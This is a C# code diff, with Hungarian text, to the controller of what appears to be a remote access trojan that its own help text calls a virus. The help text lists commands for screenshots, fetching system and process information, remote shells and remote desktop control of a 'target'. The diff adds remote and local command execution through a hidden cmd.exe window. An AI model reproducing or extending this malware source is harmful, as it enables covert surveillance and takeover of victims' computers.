@@ -72,6 +72,7 @@ audio [100]  - beállítja a hangerőt (itt pl 100-ra)
 subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást ÷(sc)÷
 reloadclient - újra indítja a már futó vírust
 |//lokális parancsok|
+cmdme [asd]  - lefuttat lokálisan egy cmd parancsot
 cdme         - könyvtárat vált ("")
 lsme         - ki listázza a könyvtár tartalmát
 exet         - átmásol, majd el is indít egy fájlt ("")
@@ -90,7 +91,8 @@ grp          - vissza küld jelet hogy még él e a gép         [$célpont spec
 fsi          - fetch system info                             [$célpont specifikus!$]
 frp          - fetch running processes                       [$célpont specifikus!$]
 fsc          - fetch screens                                 [$célpont specifikus!$]
-screenshot   - csinál egy képernyőképet        ÷(scr)÷       [$célpont specifikus!$]
+screenshot   - csinál egy képernyőképet        ÷(scr)÷         [$célpont specifikus!$]
+cmd [asd]    - cmd parancsot futtat a célpont gépén
 |//beépített programok|
 rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
              - először telepítés : ÷exet ""rSL.exe""÷
@@ -261,7 +263,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         Log("$Nem helyes a szintaxis!$");
                         break;
                     }
-                    Send(xSplittelve[0]);
+                    Send("processS");
                     Send(bemenetek[1]);
                     break;
                 case "logoff":
@@ -409,7 +411,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "exet":
                     if (!x.Contains('"'))
                     {
-                        Log("[$Nem helyes a szintaxis! (hiányzik a \")$]"); break;
+                        Log("[$!$] [$Nem helyes a szintaxis! (hiányzik a \")$]"); break;
                     }
                     filePath = bemenetek[1];
                     if (filePath.Contains("%desktop%")) filePath = filePath.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
@@ -419,7 +421,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     filePath.Replace('/', '\\');
                     if (!File.Exists(filePath))
                     {
-                        Log("[Nincs ilyen fájl!]");
+                        Log("[$!$] [$Nincs ilyen fájl!$]");
                         break;
                     }
                     if (xSplittelve.Length == 3)
@@ -493,8 +495,8 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
 
                 case "script":
-                    if (!File.Exists(bemenet)) {Log("$Nincs ilyen fálj!$"); break; }
-                    if (!(bemenet.Split('.')[1] == "ns")) { Log("$Nincs ilyen script fálj!$"); break; }
+                    if (!File.Exists(bemenet)) {Log("[$!$] [$Nincs ilyen fálj!$]"); break; }
+                    if (!(bemenet.Split('.')[1] == "ns")) { Log("[$!$] [$Nincs ilyen script fálj!$]"); break; }
 
                     foreach (string parancs in File.ReadAllLines(bemenet))
                     {
@@ -516,7 +518,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "say":
                     if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
                     {
-                        Log("$Nem helyes a szintaxis!$");
+                        Log("[$!$] [$Nem helyes a szintaxis!$]");
                         break;
                     }
                     for (int i = 0; i < bemenetek[1].Split('%').Length; i++)
@@ -537,7 +539,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                             }
                             else
                             {
-                                Log("$nincsen ilyen regisztrált változó$");
+                                Log("[$!$] [$Nincsen ilyen regisztrált változó$]");
                             }
                         }
                        
@@ -577,7 +579,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     catch (Exception)
                     {
 
-                        Log("[Nem sikerült a ciklus számláló deklarálása!$]");
+                        Log("[$!$] [$Nem sikerült a ciklus számláló deklarálása!$]");
                     }
                     
                     break;
@@ -594,7 +596,8 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                             CheckCommand(command);
                         }
                     }
-                    
+                    forCommands.Clear();
+                    forCiklusCount = 0;
                     break;
 
 
@@ -648,7 +651,45 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     Send("-");
                     break;
 
+                case "cmdme":
+                    string texted = "";
+                    try
+                    {
+                        // Parancs
 
+                        // Folyamat beállítása
+                        ProcessStartInfo psi = new ProcessStartInfo();
+                        psi.FileName = "cmd.exe";
+                        psi.Arguments = "/c " + bemenet;  // /c = futtatja, majd bezárja a cmd-t
+                        psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
+                        psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
+                        psi.UseShellExecute = false;       // kötelező a redirekcióhoz
+                        psi.CreateNoWindow = true;         // ne nyisson új ablakot
+
+                        // Folyamat indítása
+                        using (Process process = Process.Start(psi))
+                        {
+                            // Kimenet beolvasása
+                            string output = process.StandardOutput.ReadToEnd();
+                            string errors = process.StandardError.ReadToEnd();
+
+                            process.WaitForExit(); // megvárjuk, amíg lefut
+                            Console.WriteLine(output);
+                            texted = output;
+
+                            if (!string.IsNullOrEmpty(errors))
+                            {
+                                texted = errors;
+                            }
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        Log($"[$!$] [$Console hiba$]");
+                    }
+
+
+                    break;
 
 
 
@@ -679,7 +720,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
                 default:
 
-                    Log("$Nincs ilyen ismert parancs!$");
+                    Log("[$!$] [$Nincs ilyen ismert parancs!$]");
                     break;
             }
 
